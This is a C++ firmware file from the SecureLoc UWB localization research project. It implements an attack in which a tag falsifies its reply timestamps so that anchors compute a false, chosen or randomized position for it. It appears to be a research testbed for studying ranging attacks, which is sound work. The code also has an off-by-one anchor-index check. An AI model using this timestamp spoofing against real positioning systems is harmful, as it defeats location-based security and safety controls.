/****************************************************************************
* Copyright (C) 2019 LCIS Laboratory - Baptiste Pestourie
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, in version 3.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
*
* This program is part of the SecureLoc Project @https://github.com/Hedwyn/SecureLoc
 ****************************************************************************/

/**
 * @file Internal.cpp
 * @author Baptiste Pestourie
 * @date 2019 December 1st
 * @brief Source file for the cooperative anchor firmware. This firmware is intended for DecaWino chips.
 * Tags are the mobile nodes localized by the anchors.
 * @see https://github.com/Hedwyn/SecureLoc
 */


#include "InternalAttack.h"
#include "anchor_c.h"



static DecaDuino decaduino;/**< Instance for all DWM1000-related operations*/
static int state;/**< Previous state variable for the FSM- used to keep track of state changes*/
static int previous_state; /**< Keeps track of the previous state, to display state changes in debug mode*/
static int next_state; /**< Next state variable for the FSM - state to go after a serial call*/
/* UWB frames */
static uint8_t txData[128];/**< Emission buffer */
static uint8_t rxData[128];/**< Reception buffer */
static uint16_t rxLen;/**< Reception buffer length*/

/* IDs */
static byte myID[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, NODE_ID};/**< Node's tag ID */
static byte targetID [8]; /**< Buffer for the target ID field in RX frames */
static byte anchorID [8];  /**< Buffer for the anchor ID field in RX frames */
static byte sleep_slots; /**< Number of slots to sleep when turning to sleep mode */


/* timestamps */
static uint64_t t2, t3,ts_ghost_anchor;  /**< Timestamp for TWR process */

/* cooperative methods */
static byte next_target_id[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00}; /**< ID of the next target when acting as an anchor */
static byte ghost_anchor_id[8] ={0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00}; /**< ID tu claim when acting as an anchor */
static byte next_anchor_id[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00};/**< ID to call when acting as an anchor */

/* serial communications */

static char serial_command; /**<The serial command received from the host, on 1 digit*/
static int anchor_idx; /**< index of a given anchor ID in the anchor positions array */

/* attack parameters */
static long timeshifts[NB_ANCHORS] = {0};
static Position target_position = {.x = 0, .y = 0.}; /**<Position targeted by the attack */
static Position my_position = {.x = 0, .y = 3.};/**<Current position */
static int attack_is_on = 0;/**<Whether the attack is enabled or not */
static int target_generation_timer = INT_MAX;
static Position anchor_positions[NB_ANCHORS] =
{
DEFAULT_ANCHOR_1_POSITION,/* anchor 1*/
DEFAULT_ANCHOR_2_POSITION,/* anchor 2*/
DEFAULT_ANCHOR_3_POSITION,/* anchor 3*/
DEFAULT_ANCHOR_4_POSITION /* anchor 4*/
};
static const char * states[50]=
{
"Init",
"Ghost Anchor",
"Rx ON",
"Wait Start",
"Send ACK",
"Send Data",
"Serial"
};/**< States name for the debug output */

int main() {
	internal_attack_setup();
	while (1) {
		loop();
		yield();
	}

	return(0);
}

void compute_timeshifts() {
	int i;
	double legit_distance, malicious_distance, distance_shift;
	for (i = 0; i < NB_ANCHORS; i++) {
		/* calculating Euclidean distance to anchor */
		legit_distance = sqrt( pow(my_position.x - anchor_positions[i].x, 2) + pow(my_position.y - anchor_positions[i].y, 2));
		/* calculating Euclidean distance from anchor to target position */
		malicious_distance = sqrt( pow(target_position.x - anchor_positions[i].x, 2) + pow(target_position.y - anchor_positions[i].y, 2));
		/* calcualting distance shift */
		distance_shift = malicious_distance - legit_distance;
		/* computing time-of-flight */
		timeshifts[i] = 2*  (distance_shift / SPEED_COEFF); // Factor 2 required because it's a two-way trip
		Serial.print("distance shift:");
		Serial.println(distance_shift);
		Serial.print("timeshift:");
		Serial.println(timeshifts[i]);
	}
}

void generate_target_position() {
	int ran_x, ran_y;
	float normalized_ran_x, normalized_ran_y, sum_ran;
	// picking two random coordinates
	ran_x = random(100); //picking a %. Random lib does only allow picking integers. The coordinate shift is normalized later on.
	ran_y = random(100);

	// normalization
	sum_ran = (float) (ran_x + ran_y);
	normalized_ran_x = (float) ran_x / sum_ran;
	normalized_ran_y = (float) ran_y / sum_ran;

	Serial.println("Random shift:");
	Serial.println(normalized_ran_x);
	Serial.println(normalized_ran_y);

	// multiplying by noise mean
	normalized_ran_x *= NOISE_STD * 2; // mean = 2 * std for uniform probability law
	normalized_ran_y *= NOISE_STD * 2;

	// debug check
	Serial.println("Calculated coordinates shift:");
	Serial.println(ran_x);
	Serial.println(ran_y);

	// adding the random shift to the current_position to obtain target position
	target_position.x = my_position.x + normalized_ran_x;
	target_position.y = my_position.y + normalized_ran_y;

}

void internal_attack_setup() {
  delay(1000);
  pinMode(13, OUTPUT);
  pinMode(14, OUTPUT);
  //SPI.setSCK(13);
  SPI.setSCK(14);
  //set for anchors C and D
  //use pin 14 for A and B by uncommenting code lines above
  if ( !decaduino.init() ) {
    while(1) {
      digitalWrite(13, HIGH);
      delay(50);
      digitalWrite(13, LOW);
      delay(50);
    }
  }

	tag_RxTxConfig();
  state = TWR_ENGINE_STATE_INIT;
  previous_state = state;
	compute_timeshifts();
	randomSeed(analogRead(0));
}

// TODO : decaduino configure

void tag_RxTxConfig() {
	decaduino.setRxBuffer(rxData, &rxLen);
}

void loop() {
  if (state != previous_state) {
    DPRINTF("$State: ");
    DPRINTFLN(states[state]);
  }

	previous_state = state;
  switch (state) {

		case TWR_ENGINE_STATE_SERIAL:
		/* handles serial communications */
		 // reading serial command
		 serial_command = Serial.read(); // { used as termination character
		 while ((serial_command == '\r') || (serial_command == '\n')) {
			// skipping
			serial_command = Serial.read();

		 }

		 if (serial_command == (char) -1) {
			// Nothing was available
			state = next_state;
		 }
		 else {
			 switch(serial_command - ASCII_NUMBERS_OFFSET) {

				case 0:
					if (attack_is_on) {
						Serial.println("Disabling attack");
						attack_is_on = 0;
					}
					else {
						Serial.println("Enabling attack");
						attack_is_on = 1;
					}
					break;

				case 1:
					Serial.println("$ [Serial command]: Set attack target position");
					/* formatting mistakes are not handled /!\ */

					/* reading x coordinate */
					target_position.x = Serial.parseFloat();

					/* reading y coordinate */
					target_position.y = Serial.parseFloat();

					/* displaying the target position */
					Serial.print("$ New target position: ");
					Serial.print(target_position.x);
					Serial.print("; ");
					Serial.println(target_position.y);
					compute_timeshifts();
					break;

				case 2:
					Serial.println("$ [Serial command]: Get my position");
					/* formatting mistakes are not handled /!\ */

					/* reading x coordinate */
					my_position.x = Serial.parseFloat();

					/* reading y coordinate */
					my_position.y = Serial.parseFloat();

					/* displaying the target position */
					Serial.print("$ Memorized position: ");
					Serial.print(my_position.x);
					Serial.print("; ");
					Serial.println(my_position.y);
					compute_timeshifts();
					break;

				case 3:
					Serial.println("$ Set anchor positions");
					// reading anchor ID
					anchor_idx = Serial.parseInt();
					if (anchor_idx > NB_ANCHORS) {
						Serial.println("$ Dismissing command: invalid ID received");
					}
					else {
						/* Proceeding to read coordinates */
						/* reading x coordinate */
						anchor_positions[anchor_idx].x = Serial.parseFloat();

						/* reading y coordinate */
						anchor_positions[anchor_idx].y = Serial.parseFloat();

						/* displaying the target position */
						Serial.print("$ Memorized new position for anchor ");
						Serial.print(anchor_idx);
						Serial.print(" :");
						Serial.print(anchor_positions[anchor_idx].x);
						Serial.print("; ");
						Serial.println(anchor_positions[anchor_idx].y);
					}
					compute_timeshifts();
					break;
				default:
					Serial.println("$ unknown command received:");
					Serial.println(serial_command);
					break;
			 }

			 // Staying in Serial state if bytes are still available in buffer
			 if (Serial.available() > 0) {
				state = TWR_ENGINE_STATE_SERIAL;
			 }
			 else {
				state = next_state;
			 }
		 }

		break;


    case TWR_ENGINE_STATE_INIT:
		/* Default starting state */
      state = TWR_ENGINE_STATE_RX_ON;

      break;

		case TWR_ENGINE_GHOST_ANCHOR:
			/* in Cooperative mode, state for ghost anchor operations.
			The tag will switch to this state when designated by an anchor */
			state = TWR_ENGINE_STATE_INIT;
			Serial.println("Switching to ghost anchor mode");
			Serial.print("Ghost Anchor ID: ");
			Serial.println(ghost_anchor_id[7]);
			Serial.print("Number of sleep slots:");
			Serial.println((int) sleep_slots);
			anchor_setup();
			while (anchor_loop(ghost_anchor_id, next_anchor_id) != TWR_COMPLETE );
			internal_attack_setup();
			Serial.println("Ghost Anchor Job Complete");
			ghost_anchor_id[7] = 0;
			break;

    case TWR_ENGINE_STATE_RX_ON:
			/* Turns on reception and checks if the tag has been designated as ghost anchor in the previous ranging */

			decaduino.plmeRxEnableRequest();
      state = TWR_ENGINE_STATE_WAIT_START;
			if (COOPERATIVE && (ghost_anchor_id[7] != 0)  && (decaduino.getSystemTimeCounter() > ts_ghost_anchor + sleep_slots * SLOT_LENGTH) ) {
				//if (ghost_anchor_id[7] != 0) {// && (next_target_id[7] != 0)) {
					state = TWR_ENGINE_GHOST_ANCHOR;
				}
			else {
				delayMicroseconds(100);
			}
      break;

    case TWR_ENGINE_STATE_WAIT_START:
			/* Polling state for start request from anchors */

      if ( decaduino.rxFrameAvailable() ) {
        /* START format : START | targetID | anchorID */
        if ( rxData[0] == TWR_MSG_TYPE_START ) {
          VPRINTFLN("$Start received");
          for (int i=0; i<8; i++){
           targetID [i] = rxData[i+1];
           anchorID [i] = rxData[i+9];
          }
					VPRINTF("$Anchor ID: ");
					VPRINTFLN((int)anchorID[7]);
          if ( byte_array_cmp(targetID, myID) ) {
            t2 = decaduino.getLastRxTimestamp();
            state = TWR_ENGINE_STATE_SEND_ACK;
						if (anchorID[7] == MASTER_ID) {
							if (!MANUAL) {
							// in manual mode, getting position
								if (rxData[25] == 1) {
									attack_is_on = 1; // turning on the attack
									Serial.println("Enabling attack");
									my_position.x = *( (float *) (rxData + 26));
									my_position.y = *( (float *) (rxData + 30));
								}
								Serial.println("Current position: ");
								Serial.println(my_position.x);
								Serial.println(my_position.y);
								compute_timeshifts();

								// generating new target is the generation timer has ended
								if (millis() - target_generation_timer > TARGET_REFRESH_TIME) {
									target_generation_timer = millis();
									Serial.println("generating new target position");
									generate_target_position();
								}
							}
							DPRINTFLN("Received ghost anchor request from Master");
							ghost_anchor_id[7] = rxData[25];
							next_anchor_id[7] = rxData[26];
							sleep_slots = rxData[27];
							ts_ghost_anchor = t2;
						}
          }
          else{
              DPRINTFLN("Not for me" );
              state = TWR_ENGINE_STATE_RX_ON;
          }

					/* Control parameters for cooperative methods */
        }
        else {
          DPRINTFLN("Not a START frame");
          state = TWR_ENGINE_STATE_RX_ON;
        }
      }
			/* checking if any serial message is available */
			if (Serial.available() > 0) {
				next_state = state;
				state = TWR_ENGINE_STATE_SERIAL;
			}
      break;

    case TWR_ENGINE_STATE_SEND_ACK:
			/* After receiving a START, sends an acknowledgment as defined in TWR protocol.
			Memorizes acknowledgment sending time */
      txData[0] = TWR_MSG_TYPE_ACK;           //On acquite le message (champs 0 du mesage)
      for( int i =0; i<8 ; i++){
        txData[1+i] = anchorID[i];
        txData[9+i] = targetID[i];
      }
      decaduino.pdDataRequest(txData, 18,1,t2 + T23);
			//decaduino.pdDataRequest(txData, 18);
      while (!decaduino.hasTxSucceeded());
      t3 = decaduino.getLastTxTimestamp();
      state = TWR_ENGINE_STATE_SEND_DATA_REPLY;
      break;


    case TWR_ENGINE_STATE_SEND_DATA_REPLY:
			/* Sending last frame of TWR protocol, with the 2 timestamps measured */
      txData[0] = TWR_MSG_TYPE_DATA_REPLY;
      decaduino.encodeUint64(t2, &txData[17]);

			if (attack_is_on) {
				/* modifying t3 for the attack */
				VPRINTF("$ Timeshift for anchor ");
				VPRINTF(anchorID[7] - 1);
				VPRINTF(": ");
				VPRINTFLN((timeshifts[anchorID[7] - 1]) );
				t3 = t3 - timeshifts[anchorID[7] - 1];
			}
      decaduino.encodeUint64(t3, &txData[25]);
      decaduino.pdDataRequest(txData, 33);
			DPRINTF("$Temperature: ");
			DPRINTFLN(decaduino.getTemperature());
      while (!decaduino.hasTxSucceeded());
      state = TWR_ENGINE_STATE_INIT;
      break;

    default:
      state = TWR_ENGINE_STATE_INIT;
      break;
  }
}
